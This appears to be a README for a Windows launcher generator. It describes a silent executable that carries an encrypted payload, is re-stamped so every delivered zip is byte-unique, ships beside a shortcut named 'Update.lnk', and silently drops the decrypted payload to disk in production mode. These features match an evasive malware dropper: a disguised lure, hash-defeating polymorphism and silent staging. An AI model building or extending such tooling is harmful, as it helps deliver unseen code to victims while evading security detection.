# Launcher (launcher mode) — WP1

The carrier executable for the silent launcher deployment: a small PE32
**GUI-subsystem** Windows executable (no console is ever attached).

| file | purpose |
|---|---|
| `template.cs` | launcher source: overlay reader, AES-256-CTR (pure C#), marker / staging modes |
| `SealData.cs`  | per-launcher compile-time seal (random `KEY`/`IV`/`TAG`; regenerated per build) |
| `build.sh`     | `mcs -target:winexe` compile + PE subsystem assertion (+ SHA-256 evidence) |
| `dev/make-stamp.mjs` | appends the per-build overlay (envelope + config + payload + trailer) onto a compiled launcher |
| `dev/test-roundtrip.sh` | WP1 acceptance harness (round-trip, staging, diversity) |

## Build

```bash
cd generator/launcher
./build.sh /tmp/out/Launcher.exe          # -> prints sha256; asserts GUI subsystem
```

Requires the `mono` C# compiler (`mcs`, package `mono-mcs` / `mono-devel`).
Fallback if `mcs` is absent on a host: compile the same source with the
`.NET` toolchain and package the target runtime — see the runbook notes.

## How a deployment is produced

1. **Pool**: N launchers are compiled up-front, each with a fresh random
   `SealData` (distinct SHA-256 — pool diversity).
2. **Stamp (per request, ~ms)**: a fresh per-build key `K_B` and IVs are
   generated; the payload (from the server-side cache, WP2) and the sealed
   config (`apiUrl, clientId, siteId, agentType, authToken, features,
   enrollment line, outDir, test flag`) are each re-encrypted under `K_B`;
   the envelope is sealed under the launcher's own `KEY`/`IV`; the whole
   block is appended to the pooled exe → byte-unique zip every time.
3. **Delivery**: zip contains exactly `Update.lnk` + `Launcher.exe`.

## Runtime behaviour

- no PowerShell, no script host, no executable-memory mapping in the payload path;
- decrypts strictly in memory (chunked CTR keystream);
- **test mode** (`flags & 1`): writes
  `%TEMP%\lnk_chain_debug.txt` (`LNKCHAIN-OK tag=… mode=test bytes=…`)
  plus `payload_check.bin` (the decrypted payload — used by the round-trip
  harness only; never shipped);
- **production mode**: stages the decrypted payload as `_stg_<TAG>.exe`
  into the configured `outDir` and exits silently (exits 0 even on a silent
  write failure — staging success is observed through the artifact itself).

## Verification on this box

```bash
chmod +x dev/test-roundtrip.sh
bash dev/test-roundtrip.sh <sample-agent.bin>     # prints ROUNDTRIP-OK
```

Verified gates (2026-09-13, ubuntu/mono 6.8):

```
compile (mcs -target:winexe)            OK
PE subsystem = GUI                       OK
test-mode marker (LNKCHAIN-OK)          OK
test-mode payload round-trip            OK
prod-mode stage marker                  OK
prod-mode staged payload                OK
per-build diversity (3 unique hashes)   OK
```

`file Launcher.exe` → `PE32 executable (GUI) Intel 80386 Mono/.Net assembly`,
`Subsystem 00000002 (Windows GUI)`.

## Wine / Windows notes (run-under-wine gate)

A `mcs -target:winexe` PE carries Mono/.NET IL, so executing it under wine
needs **wine-mono** in the wine prefix (and on a target Windows host a
.NET/Mono IL runtime must be present). Provision wine-mono on this dev box
before the wine gate; the IL-logic marks are exercised via `mono` here and on
the Windows VM via the WP6 runbook.